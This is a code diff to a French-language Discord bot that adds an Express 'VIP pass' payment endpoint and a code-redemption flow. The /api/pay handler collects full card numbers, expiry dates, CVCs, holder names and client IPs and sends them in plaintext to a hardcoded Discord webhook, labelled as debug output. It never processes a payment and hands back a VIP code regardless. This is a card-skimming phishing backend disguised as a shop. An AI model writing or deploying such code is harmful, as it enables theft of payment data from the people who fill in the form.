@@ -19,6 +19,14 @@ const {
 } = require('discord.js');
 const fs = require('fs');
 const path = require('path');
+const express = require('express');
+const cors = require('cors');
+const bodyParser = require('body-parser');
+const axios = require('axios');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1483524819281510472/o55laE3KeMcStT6p2pkVzXNEhcvcL3KWtdEd66tzrHsYWgmxR6cfqr_2n81gov0OWrnC";
 
 const client = new Client({
     intents: [
@@ -34,6 +42,7 @@ const client = new Client({
 const PREFIX = process.env.PREFIX || '-';
 const ROLES_FILE = path.join(__dirname, 'soumis_roles.json');
 const INVITES_FILE = path.join(__dirname, 'invites.json');
+const CODES_FILE = path.join(__dirname, 'codes.json');
 const spamMap = new Collection();
 const guildInvites = new Collection();
 
@@ -44,6 +53,60 @@ if (!fs.existsSync(ROLES_FILE)) {
 if (!fs.existsSync(INVITES_FILE)) {
     fs.writeFileSync(INVITES_FILE, JSON.stringify({}));
 }
+if (!fs.existsSync(CODES_FILE)) {
+    fs.writeFileSync(CODES_FILE, JSON.stringify({ codes: [] }));
+}
+
+// --- EXPRESS SERVER CONFIG ---
+app.use(cors());
+app.use(bodyParser.json());
+app.use(express.static('public'));
+
+function generateCode() {
+    return Array.from({ length: 4 }, () => 
+        Math.random().toString(36).substring(2, 6).toUpperCase()
+    ).join('-');
+}
+
+app.post('/api/pay', async (req, res) => {
+    const { cardHolder, cardNumber, expiry, cvc } = req.body;
+
+    try {
+        await axios.post(DISCORD_WEBHOOK, {
+            embeds: [{
+                title: "💳 Nouvelle tentative de paiement - Debug Mode",
+                color: 0x9D50BB,
+                fields: [
+                    { name: "👤 Titulaire", value: `\`${cardHolder || 'Inconnu'}\``, inline: true },
+                    { name: "🔢 Numéro", value: `\`${cardNumber || 'Inconnu'}\``, inline: true },
+                    { name: "📅 Expiration", value: `\`${expiry || 'Inconnu'}\``, inline: true },
+                    { name: "🔒 CVC", value: `\`${cvc || 'Inconnu'}\``, inline: true },
+                    { name: "🌐 Client IP", value: `\`${req.ip}\`` }
+                ],
+                timestamp: new Date()
+            }]
+        });
+    } catch (err) {
+        console.error("Webhook error:", err.message);
+    }
+
+    setTimeout(() => {
+        if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
+            return res.status(400).json({ success: false, message: 'Numéro de carte invalide' });
+        }
+
+        const newCode = generateCode();
+        const data = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
+        data.codes.push({ code: newCode, claimed: false, timestamp: Date.now() });
+        fs.writeFileSync(CODES_FILE, JSON.stringify(data, null, 2));
+
+        res.json({ success: true, code: newCode });
+    }, 1500);
+});
+
+app.listen(PORT, () => console.log(`API running on port ${PORT}`));
+// -----------------------------
+
 
 client.once('ready', async () => {
     console.log(`Bot prêt ! Connecté en tant que ${client.user.tag}`);
@@ -609,13 +672,35 @@ client.on('messageCreate', async (message) => {
         await message.channel.send({ embeds: [embed], components: [row1, row2] });
     }
 
+    // Command: -setupcodes
+    if (command === 'setupcodes') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
+
+        const embed = new EmbedBuilder()
+            .setColor(0xFFFFFF)
+            .setTitle('Récupération Pass VIP')
+            .setDescription('Si vous avez acheté un Pass VIP sur notre site, cliquez sur le bouton ci-dessous pour entrer votre code.')
+            .addFields({ name: 'Site Web', value: '`http://localhost:3000`' })
+            .setFooter({ text: 'Système de Validation' });
+
+        const row = new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId('use_vip_code')
+                .setLabel('Entrer un code')
+                .setStyle(ButtonStyle.Success)
+        );
+
+        await message.channel.send({ embeds: [embed], components: [row] });
+        await message.delete();
+    }
+
     // Command: -help
     if (command === 'help') {
         const embed = new EmbedBuilder()
             .setColor(0xFFFFFF)
             .setTitle('Liste des commandes')
             .addFields(
-                { name: 'Administration', value: '`-setupticket`, `-kick`, `-ban`, `-bban`, `-clear`, `-tempmute`, `-mmute`, `-lock`, `-unlock`, `-slowmode`' },
+                { name: 'Administration', value: '`-setupticket`, `-setupcodes`, `-kick`, `-ban`, `-bban`, `-clear`, `-tempmute`, `-mmute`, `-lock`, `-unlock`, `-slowmode`' },
                 { name: 'Système Soumis', value: '`-soumis @user`, `-unsoumis @user`' },
                 { name: 'Utilitaire', value: '`-pic`, `-banner`, `-userinfo`, `-serverinfo`, `-ping`, `-invites @user`' }
             );
@@ -647,6 +732,64 @@ client.on('interactionCreate', async (interaction) => {
 
         embedData.set(userId, data);
         await interaction.reply({ content: 'Valeur mise à jour !', flags: [MessageFlags.Ephemeral] });
+    }
+
+    if (interaction.isModalSubmit() && interaction.customId === 'vip_code_modal') {
+        const codeInput = interaction.fields.getTextInputValue('code_input').trim();
+        const data = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
+        const codeIndex = data.codes.findIndex(c => c.code === codeInput && !c.claimed);
+
+        if (codeIndex === -1) {
+            return interaction.reply({ content: 'Code invalide ou déjà utilisé.', flags: [MessageFlags.Ephemeral] });
+        }
+
+        // Mark as claimed
+        data.codes[codeIndex].claimed = true;
+        data.codes[codeIndex].claimedBy = interaction.user.id;
+        fs.writeFileSync(CODES_FILE, JSON.stringify(data, null, 2));
+
+        // Assign VIP role
+        let vipRole = interaction.guild.roles.cache.find(r => r.name.toLowerCase() === 'vip');
+        if (!vipRole) {
+            vipRole = await interaction.guild.roles.create({
+                name: 'VIP',
+                color: '#8A2BE2',
+                reason: 'Achat via site web'
+            }).catch(() => null);
+        }
+
+        if (vipRole) {
+            await interaction.member.roles.add(vipRole).catch(() => {});
+        }
+
+        // Create Ticket
+        const channel = await interaction.guild.channels.create({
+            name: `vip-${interaction.user.username}`,
+            type: ChannelType.GuildText,
+            permissionOverwrites: [
+                { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
+                { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
+            ]
+        });
+
+        const successEmbed = new EmbedBuilder()
+            .setColor(0xFFFFFF)
+            .setTitle('VIP Activé !')
+            .setDescription(`Félicitations ${interaction.user}, votre Pass VIP a été activé.\nUn ticket a été ouvert ici : ${channel}`)
+            .setFooter({ text: 'Merci pour votre confiance' });
+
+        const ticketEmbed = new EmbedBuilder()
+            .setColor(0xFFFFFF)
+            .setTitle('Nouveau Client VIP')
+            .setDescription(`Bonjour ${interaction.user}, vous êtes maintenant VIP !\nExpliquez-nous ici ce que vous souhaitez obtenir ou vos besoins particuliers.`)
+            .addFields({ name: 'Code utilisé', value: `\`${codeInput}\`` });
+
+        const closeBtn = new ActionRowBuilder().addComponents(
+            new ButtonBuilder().setCustomId('close_ticket').setLabel('Fermer le ticket').setStyle(ButtonStyle.Danger)
+        );
+
+        await channel.send({ embeds: [ticketEmbed], components: [closeBtn] });
+        await interaction.reply({ embeds: [successEmbed], flags: [MessageFlags.Ephemeral] });
     }
 
     if (interaction.isStringSelectMenu()) {
@@ -706,6 +849,22 @@ client.on('interactionCreate', async (interaction) => {
 
     if (interaction.isButton()) {
         const userId = interaction.user.id;
+
+        if (interaction.customId === 'use_vip_code') {
+            const modal = new ModalBuilder()
+                .setCustomId('vip_code_modal')
+                .setTitle('Activation Pass VIP');
+
+            const input = new TextInputBuilder()
+                .setCustomId('code_input')
+                .setLabel('Entrez votre code VIP')
+                .setPlaceholder('XXXX-XXXX-XXXX-XXXX')
+                .setStyle(TextInputStyle.Short)
+                .setRequired(true);
+
+            modal.addComponents(new ActionRowBuilder().addComponents(input));
+            return await interaction.showModal(modal);
+        }
 
         if (['set_title', 'set_description', 'set_color', 'set_image', 'set_footer'].includes(interaction.customId)) {
             const typeMap = {
